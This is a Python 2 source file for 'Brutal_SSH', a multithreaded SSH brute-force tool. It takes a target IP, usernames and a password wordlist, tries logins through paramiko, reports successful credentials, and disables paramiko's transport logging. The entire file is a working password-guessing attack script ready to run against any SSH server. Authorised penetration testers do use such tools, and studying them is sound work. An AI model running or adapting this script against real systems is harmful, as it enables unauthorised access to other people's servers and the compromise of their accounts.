#!/usr/bin/evn python
from config import *
import argparse
from threading import Thread
import Queue
import paramiko
import socket
import sys
import time
import logging


class Brutal_SSH():

	def __init__(self):
		self.__version__ = "1.0"
		self.host_ip = ""
		self.host_port = 22
		self.usernames = Queue.LifoQueue()
		self.passwords = Queue.LifoQueue()
		self.password_list = []
		self.threads = 4
		self.timeout = 5
	
	def do_bruteforce(self):
		self.banner()
		use = "\r" + info_out + ffb + "python " + fgb + "brutal_ssh.py " + ffb + "-i Host [OPTION]" + sf
		parser = argparse.ArgumentParser(description='', usage=use)
		parser._optionals.title = ffb + "Basic Help Menu" + sf
		parser.add_argument('-i', '--ip', action="store" ,dest='host_ip', help='Target IP Address', required=True)
		parser.add_argument('-p', '--port', action="store" , default=22, type=int, dest='host_port', help='Target Port Number (Default 22)')
		parser.add_argument('-u', '--user', action="store", dest='user', help='SSH User name (Default root)')
		parser.add_argument('-U', '--usersfile', action="store" ,dest='usersfile', help='Usernames File Path')
		parser.add_argument('-P', '--passowrdsfile', action="store", default="wordlist/passfile.txt", dest='passwordsfile', help='Passwords File Path')
		parser.add_argument('-t', '--threads', action="store", default=4 , type=int, dest='threads', help='No of threads (Default 4)')
		parser.add_argument('-T', '--timeout', action="store", default=5 , type=int, dest='timeout', help='Request timeout (Default 5)')
		# parser.add_argument('-o', '--output', action="store" , dest='output', help='Output file name')

		args = parser.parse_args()
		
		if not args.host_ip:
			print parser.print_help()
			exit()

		self.host_ip = args.host_ip
		self.host_port = args.host_port
		self.threads = args.threads
		self.timeout = args.timeout
		if args.user: self.usernames.put(args.user)
		elif args.usersfile: self.do_fill_queue(args.usersfile, True)
		if args.passwordsfile: self.do_fill_queue(args.passwordsfile, False)
		self.go_brutal()
		
	def banner(self):
		print fcb + """ 
 ____             _        _   %s  ____ ____  _   _ 
%s| __ ) _ __ _   _| |_ __ _| |  %s / ___/ ___|| | | |
%s|  _ \| '__| | | | __/ _` | |  %s	\___ \___ \| |_| |
%s| |_) | |  | |_| | || (_| | |  %s	 ___) |__) |  _  |
%s|____/|_|   \__,_|\__\__,_|_|  %s |____/____/|_| |_| %s%s%s

			""" % (frb, fcb,frb, fcb, frb, fcb, frb, fcb, frb, sf,"@d3vilbug v", self.__version__) 

	def do_readfile(self, filename):
		try:
			with open(filename) as file:
				file_list = file.readlines()
				file_list = [line.strip() for line in file_list]
				return list(set(file_list))
		except IOError:
			print err_out + "File Not Found." + sf
			exit(0)

	def do_fill_queue(self, filename, flag=False):
		if flag:
			print ver_out + "{:.<50}".format("Reading username file") + sf
			for username in self.do_readfile(filename):
				self.usernames.put(username)
		else:
			print ver_out + "{:.<50}".format("Reading password file") + sf
			self.password_list = self.do_readfile(filename)
			# for password in self.do_readfile(filename):
			# 	self.passwords.put(password)
	def do_fill_pass_queue(self):
		for password in self.password_list:
			self.passwords.put(password)
	
	def do_ssh(self, username):
		while not self.passwords.empty():
			# time.sleep(0.1)
			password = self.passwords.get()
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			try:
				ssh.connect(self.host_ip, port=self.host_port, username=username, password=password, timeout=self.timeout)
				print info_out + ffb + "{} : {:.<50} {}".format(username, password, fgb + "Successful" + sf)
				ssh.close(); exit(0)
			except paramiko.AuthenticationException:
				print ver_out + ffb + "{} : {:.<50} {}".format(username, password, frb + "Failed" + sf)
			except socket.error, e:
				print err_out + ffb + "{} : {:.<50} {}".format(username, password, fcb + "Connection Failed" + sf)
			except paramiko.SSHException: 
				print err_out + ffb + "{} : {:.<50} {}".format(username, password, fbb + "Error" + sf)

	def do_brute_single(self, username):
		threads_list = []
		t_threads = self.threads + 1
		self.do_fill_pass_queue()
		for x in range(1, t_threads):
			# time.sleep(4)
			thread = Thread(target=self.do_ssh, args=(username,))
			thread.start()
			threads_list.append(thread)

		for thread in threads_list:
			thread.join()

	def go_brutal(self):
		logging.basicConfig()
		paramiko_logger = logging.getLogger("paramiko.transport")
		paramiko_logger.disabled = True
		while not self.usernames.empty():
			self.do_brute_single(self.usernames.get())

if __name__ == '__main__':
	start = time.time()
	brutal_shh = Brutal_SSH()
	brutal_shh.do_bruteforce()
	end = time.time()
	print "\n"
	print "-"*20
	print end - start
	print "-"*20
